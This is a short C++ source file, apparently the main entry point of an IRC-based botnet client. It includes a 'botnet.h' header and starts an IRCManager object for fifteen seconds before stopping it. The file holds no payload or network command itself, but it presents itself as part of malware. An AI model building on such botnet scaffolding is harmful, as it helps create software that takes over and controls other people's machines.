#include "botnet.h"

using namespace std;

int main(int argc, char *argv[], char *envp[]) {
	IRCManager* ircm = new IRCManager();
	ircm->start();
	Sleep(15000);
	ircm->stop();

	return 0;
}
